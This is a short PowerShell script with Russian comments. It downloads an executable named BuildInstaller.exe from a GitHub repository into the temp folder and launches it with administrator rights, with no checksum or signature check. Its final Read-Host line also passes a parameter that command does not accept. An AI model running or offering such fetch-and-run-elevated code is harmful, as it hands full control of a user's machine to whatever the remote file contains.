# Устанавливаем протокол TLS 1.2
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Укажите прямую ссылку на файл
$url = "https://github.com/zabolotny7/test/raw/refs/heads/main/BuildInstaller.exe"
$filePath = "$env:TEMP\downloaded_program.exe"

# Установка тайм-аутов для запроса
$webRequest = [System.Net.WebRequest]::Create($url)
$webRequest.Timeout = 60000  # Увеличьте время ожидания (в миллисекундах)
$webRequest.ReadWriteTimeout = 60000  # Время ожидания для чтения и записи

# Скачивание файла
$response = $webRequest.GetResponse()
$stream = $response.GetResponseStream()
$fileStream = [System.IO.File]::Create($filePath)
$buffer = New-Object byte[] 1024
$bytesRead = 0

while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
    $fileStream.Write($buffer, 0, $bytesRead)
}

# Закрытие потоков
$fileStream.Close()
$stream.Close()

# Проверка существования файла
if (Test-Path $filePath) {
    Write-Host "Файл успешно загружен: $filePath" -ForegroundColor Green

    # Запуск программы от имени администратора
    Write-Host "Запускаю программу от имени администратора..." -ForegroundColor Green
    Start-Process -FilePath $filePath -Verb RunAs
} else {
    Write-Host "Ошибка: файл не был загружен." -ForegroundColor Red
}

# Ожидание нажатия клавиши для закрытия
Read-Host "Нажмите любую клавишу, чтобы закрыть окно..." -ForegroundColor Yellow
Pause
